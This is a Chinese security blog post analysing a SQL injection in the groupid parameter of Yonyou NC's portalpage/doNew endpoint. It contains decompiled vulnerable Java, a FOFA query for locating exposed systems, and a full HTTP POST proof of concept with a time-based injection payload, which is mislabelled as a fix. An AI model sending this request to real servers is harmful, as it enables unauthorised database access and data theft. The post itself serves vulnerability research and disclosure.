---
title: "用友NC portalpage/doNew sql注入漏洞"
source: https://mrxn.net/jswz/yonyou-nc-portalpage-doNew-groupid-sqli.html
asset_dir: assets/用友nc-portalpagedonew-sql注入漏洞
---

# 用友NC portalpage/doNew sql注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/2/10 18:12
- 1122浏览
- [0评论](#comment)
- 52分钟阅读

深入探索

SQL

server

sql

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B "用友")NC系统可利用/portal/pt/portalpage/doNew接口中的 groupid 参数实现sql注入，从而窃取服务器的敏感信息。

编程

# 影响版本

NC63、NC633、NC65

# fofa语法

> `app="用友-UFIDA-NC"`

# 漏洞分析

本来是根据官方漏洞通告追workflowImageServlet和importPml接口的SQL注入，不曾巧发现了同文件里的其他注入点 doNew

[![用友NC portalpage/doNew sql注入漏洞](images/img-001-5bf9eb24af7e.webp)](https://image.mrxn.net/f787520ff23041009e3b97c5e9358d22.webp)

因此搜索 doNew 方法的实现部分即可定位文件

代码安全审计

nc/uap/portal/action/PortalPageManagerAction.class

```
package nc.uap.portal.action;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.net.URLDecoder;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.servlet.http.HttpServletRequest;
import nc.uap.lfw.core.AppInteractionUtil;
import nc.uap.lfw.core.LfwRuntimeEnvironment;
import nc.uap.lfw.core.exception.LfwRuntimeException;
import nc.uap.lfw.login.vo.LfwSessionBean;
import nc.uap.lfw.servletplus.annotation.Action;
import nc.uap.lfw.servletplus.annotation.Param;
import nc.uap.lfw.servletplus.annotation.Servlet;
import nc.uap.lfw.servletplus.core.impl.BaseAction;
import nc.uap.portal.constant.PortalEnv;
import nc.uap.portal.exception.PortalServiceException;
import nc.uap.portal.log.PortalLogger;
import nc.uap.portal.om.Page;
import nc.uap.portal.service.PortalServiceUtil;
import nc.uap.portal.service.itf.IPtPageQryService;
import nc.uap.portal.util.PmlUtil;
import nc.uap.portal.util.PortalPageDataWrap;
import nc.uap.portal.util.PtUtil;
import nc.uap.portal.vo.PtPageVO;
import nc.vo.ml.NCLangRes4VoTransl;
import nc.vo.pub.BusinessException;
import nc.vo.pub.lang.UFBoolean;
import org.apache.commons.collections.MapUtils;
import org.apache.commons.io.IOUtils;
import org.apache.commons.lang.ArrayUtils;
import org.apache.commons.lang.StringUtils;
import org.springframework.web.multipart.MultipartException;
import org.springframework.web.multipart.MultipartFile;
import org.springframework.web.multipart.MultipartHttpServletRequest;
import org.springframework.web.multipart.MultipartResolver;
import org.springframework.web.multipart.commons.CommonsMultipartResolver;
import org.xml.sax.SAXException;
import uap.lfw.core.ml.LfwResBundle;
import uap.portal.cache.PageCacheHelper;

@Servlet(
    path = "/portalpage"
)
public class PortalPageManagerAction extends BaseAction {
    private static MultipartResolver multipartResolver = new CommonsMultipartResolver();

    public PortalPageManagerAction() {
    }

@Action(
    method = "POST"
)
public void doNew(@Param(name = "groupid") String pk_group, @Param(name = "pml") String pml) {
    LfwSessionBean ses = LfwRuntimeEnvironment.getLfwSessionBean();
    if (pml != null && ses != null) {
        try {
            Page page = PmlUtil.parser(URLDecoder.decode(pml, "UTF-8"));
            String pagename = page.getPagename();
            if (page == null || PtUtil.isNull(pagename)) {
                return;
            }

            IPtPageQryService qry = PortalServiceUtil.getPageQryService();
            PtPageVO[] pages = qry.getPagesByCondition(" pk_group='" + pk_group + "' and pagename='" + pagename + "' and fk_pageuser='*'");
            if (!ArrayUtils.isEmpty(pages)) {
                this.print("<result><success>false</success><detail>" + NCLangRes4VoTransl.getNCLangRes().getStrByID("pmng", "PageManagerMainViewController-000030") + "</detail></result>");
                return;
            }

            PtPageVO vo = this.pml2vo(page, pk_group);
            vo.setNewversion("1");
            String pk = PortalServiceUtil.getPageService().add(vo);
            this.print("<result><success>true</success><pk>" + pk + "</pk></result>");
        } catch (UnsupportedEncodingException e) {
            PortalLogger.error(e.getMessage(), e);
        } catch (SAXException e) {
            PortalLogger.error(e.getMessage(), e);
            this.print("<result><success>false</success><detail>" + NCLangRes4VoTransl.getNCLangRes().getStrByID("pmng", "PortalPageManagerAction-000000") + "</detail></result>");
        } catch (BusinessException e) {
            PortalLogger.error(e.getMessage(), e);
            this.print("<result><success>false</success><detail>" + e.getMessage() + "</detail></result>");
        }

        PageCacheHelper.updatePageCache();
    }
}
```

pml 需要不为空或null，且存在 pagename 节点（XML内容）同时需要有登录权限  
groupid 即 pk\_group 直接拼接进 getPagesByCondition 语句中，其实现逻辑及其后续处理参考 [用友NC setting/renew sql注入漏洞](https://mrxn.net/jswz/yonyou-nc-setting-renew-pageName-pageModule-sqli.html "用友NC setting/renew sql注入漏洞") 部分，都是相同的调用处理，这里不再赘述。  
最终直接调用 session.executeQuery 执行上面组合后的SQL语句，造成[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL注入")漏洞。

# 漏洞复现

[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞")利用需要注意只能是post方法，且因为 `LfwRuntimeEnvironment.getLfwSessionBean()` 存在需要登录权限。

漏洞修复方案

```
POST /portal/pt/portalpage/doNew?pageId=login HTTP/1.0
Host: nc65.mrxn.net
Cookie: JSESSIONID=xx.server
Content-Type: application/x-www-form-urlencoded
Content-Length: 293

groupid=1' AND 3040=DBMS_PIPE.RECEIVE_MESSAGE('RDS',3)--&pml=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22%3F%3E%0D%0A%3Cpage+template%3D%22adminonerow%22+version%3D%22101%22++i18nname%3D%22admin-00001%22++visibility%3D%220%22+pagename%3D%22default%22%3E%0D%0A%3C%2Fpage%3E
```

# 参考

- `https://security.yonyou.com/#/noticeInfo?id=658`
- `https://security.yonyou.com/#/noticeInfo?id=524`

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [6.参考](#toc-6-)

  
  

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALQUlEQVR4Aeydi3IbuQ5EdfL//5y7cOeMhhhSI9uJpao7qsX2dKMB0gTl+JGt/XW73X5/JX63lz2avNGef5brewZdTO+Kd737e37FV7r9voI1kP/qrn/e5QS2gfw37dszcbZx4AYcbPYGpvlDwR/BOvGPPN0rfK63vTpC+rgmhOuDcAiqd7T+DPd120D24vX8uhM4DAQydRjxbIv9Fjzrh6xjvXVySB6CXdc/QxhrZp69BqMfwveeenYP9fxMQPrAiLPaw0Bmpkv7uRP4awOBTL9vHUb92dsF8zqIbh8IB7Y/V8720PPf5e7lu32q/q8NpJpd8f0T+PZAIDfUrUA4BL09EA4jmu/16iKkrvvkhTB6StsHJA9Bc64hfxa/Wveo/7cH8qj5lfv8CRwG4tQ7rlp33wf//Xv7fA7jbbSPPjmMPhi5PtH6Geo5Q2thvpb5jjD3r9br9fKZ/zCQmenSfu4EtoFApg6PsW8N4leHkauvbgXE3/NymOftC8kDShvaQ6FzddE8MPw0AUauX4R5HqLDY7RP4TaQIle8/gR+eSs+i6ut2wdyKzq3Dp7L61+h/QvPPJA1Vz6Y56t3BYx5GLl9y/vVuN4hnuKb4GEgkKlDsO8TokPQPIxcXew3Rv2rCFkPjmhPSE6+QvdmvvNndch6ELQORq4+w8NAZqZL+7kT2AYCmaK3Q4ToEFQ/22L3QeohaB5G3vvqU5fPcOVRF62FrN11OSQPQXXrRfWOMNb1/IxvA5klL+3nT+AXjFOEcAj2WwDR3ap5EZKHoL6OkLx1PS+H+IDp9wZwz1vTEeLpumtD8jCifn1yEZ7zn9Xbr/B6h9QpvFFsAzmbovmOMN6SVb7r/QwgffSZ7xzi63l9hTB69D6L1WMfMPaDkdvXGrkIox9Grq9wG0iRK15/AoeBOGXRLUKmCkH17lMXzUPqINj1Z7k+EdIP7ujaol55x1Ue0rP7Vxzih6B9RYje6yE6cDsM5Ha9XnoC20AgU3I3MHL11bRXeq+TnyFkffvqh+gQVN+jNTB61Pfe/XPPy0WY9zPfEUb/fq3V8zaQleHSf/YEtp/2uizMp+r0YcxDOAT19X6QvPoKrRdhrFOfYe+pRx3SC4LqHSF5GLH7VhxS1/Pu5xFe75B+ai/m20D61Pq+IFPvvs6tg9GvLkLyn+UwrwNs9fEdPdy5CfcqB27sQl3UL6qLwLYWoLyhdcCHzwSEwxG3gWi+8LUnsA0ExmmttgXP+bwdvY+62POQ/j0vFyG+Xl9cTz3vA8aalW9fs3/WL5pbcRjX637r9rgNRPOFrz2BbSBO6Ww7+kTILYARex/9XV9xSD/rILz7zReag3hhxPLsQ78I8evpeuf6IHXmRfPyFULqges79dubvQ6/D+n761OG+zTh/jfO9Ym9T+eQPl23Xux5GOsgHO57sab3gLsX7s/6n8XeVw73nnB/ti9EW/HSt09ZRa54/QmcDgTGqXob+tYhPpijfkjePmLPd959neufoV5Rj7wjZI8Q1A8jV+9oP/XO1Wd4OpBZ0aX9uxNYDqRPVQ65JfLV1syLMNZBOATt0/3qMPrU9RdCPPVcAeEQ7DUw6uY7Vq99wLxOz+12+2jR+Yd48q/lQE7qrvQ/OoHlQCC3wCnDnMOo933CmIfw7uvcdUXznasXmoOsIRchOgS7Xj0q1Ou5AuKv5wrzMOoQDsHy7sM6NfkelwOx6MKfPYFtIDCfKow6jNztwqjDnO9vQz1bX88VchHmfSA6HNFaEeKp/hXP6vqqpkLeEdJ/pUPyEOy+Pd8Gshev59edwDaQugEVq61Ubhb6zcnFrsPjWwLJQ9A+He07Q73wXI/u7z0hfWBEfdbLO5oXIX06B66fZd3e7HX4nbrTXe0TxumufCt91R/mffWLvS+kDuip7b8Ethb4+M2d/FDwR4D4IPhH3vrJYcyf6WfrVv32KavIFa8/gWsgr5/BsINtIJC3HwTLNYvV2w7mdRDdOgi3t7rYdfkKrSvsHhjXWuVh9FWvWfT6Fbe252Fcx7z+wm0gJi987QkcfkFVU9qH24NMF0Y0L1q74uqQPnKx18PcB9HhiPbq2HubX+nmYVxDvSOMPgjvvkf8eoc8Op0X5LYve70lkKlCsO9J3wr1m4fHfSB5GNE+K7T/HldeGHtDuLVndfpW2Ov1qcs7QvYBd7zeIZ7am+ByIE6z7xPu0wR6euPAxzdhm3Dy0NeDsR5GbjuIDse/5KCno2tBas2rr7j6GUL62g/CrYOR6ytcDsTiC3/2BA5fZfXla2oV6vVcIYdMG0Yszz70d9QDqZeL3S+Ho9/cGUJq9UE4zFHfCt2ruPJB+usTITpw/XDx9mavpz9l9Wn6cah3NH/Exwrktuiyr/wzaG3Hz/TYeyF7gxH1QHR5R/ehDkf/0wOxyYX/9gS2gcBxWrU0jLpTFsuzD4gfgvvcZ55hrHe9jhAfsGwPDF/x9R690HzX5T0P6X+mQ3y9j3WF20A0XfjaE9i+U+/bgHGaEA5z7PUrXregwjykn7xyFfIzLK8B6SXvtZB81zuH0QfhvW/nEJ/9zEN0uXkRkgeur7Jub/Zafspyms+iH5d+uQj3WwAob9jr5MDH538IWgDhcMdVjXqvlYv6VghZSz+E61cXYZ6H6PqsL1wORPOFP3sC23fqNZ2K1fKQqcKI+iG6vHpVdF5aBYx+fTDXzYvVo0K+x9Ir1GDeE6KXtwLCIdjry1OhXs8VEH8970OfCKNPfY/XO2R/Gm/wfPgqywmv9rbKq0NugfUw5/q7Tx3Guu6DMW/+M+havWalQ9aEEfXDqPe+chh9cOfXO8RTehPcBgL3KQHL7QEfX/VogJF33duj3rHnIf3URes6Vy+E1NbzLKwVZ57SIH0gWFqFdWJpFfDYB8n3uqrtsQ2kJy7+mhM4DMQpQqYKQbdnXlQXuw7zev2QvHXiKq+ub4Z6OkLWgjl2v9w1YKzreTnMfebtJ6oXHgZS4hWvO4HlQJye6Bbh8fQhef3Ww6j3vBzig6C6CNHhiHo6ugfxs3n9vb7zMx8c9wz3vwtQ/ZYDsfmFP3sCh4HAOEW3U9ObhXlRjxzSTy5CdAiqrxDi6/3lhb22tAp1SA955SogOgRLq9DXsXIVz+qf8R0G0osv/rMnsP0sqy9bN6Ci65Bb9KzeffLqXSEXS6vovLQKGNeHcFijvTpCarou//07//s/OcQPwZUO87x+sT6eCogfuH4fcnuz1/azrJrUPlb71LPKQ6ZtXr8IY17fCmHut98M7WUOxh7q3acO8cOI3Q/Jd90+onkRxjr1wuvPkDqFN4rtzxDI1OA57B/DV25D9eh1kPW7Xt5ZQPzAIQ18/Nxt1euzel9gVQ9Zt/vl1sHRd71DPKU3wW0gTu0M+771wzhtddE6OYx+GLn+M7Rf4Zn3LA/ZAwTP/Kt87aVilX+kbwN5ZLpyP3cCh4FAbgeM+OyW6mZUwOP68lRAfPVc8ew6kDo4oj2qX4VchNTIxfLuY6XDvB6iw4j2eQYPA3mm6PL8uxP49kAgt8GbBSM/23qv0w/pIxf1d1561+RiefYB4xowcr0QHYJdl6/W6fqKl/7tgVSTK/7eCfy1gUBuz2prMOZh5N4y0T6dQ+rUIRywZEPg4/sQmGPv0bmN1EV1EdJfLsJcNy/at/CvDcTmF37vBA4DqSnNYrWMXvOdr/Tug9wmCK7y6jD61Athnut7gfjUxepRAclD0DyEl2cf5s8QUj/zHQYyM13az53ANhDI1OAxrrbmTTEP6dP1npd3hNRD0D4Q3v3FYZ6DUYeR27t6PAoY6/RC9LM+EF+vg+jA9fuQ25u9tnfIm+3r/3Y7/wMAAP//8HJGSAAAAAZJREFUAwDtE1nOm7LmCAAAAABJRU5ErkJggg==)

手机扫码阅读
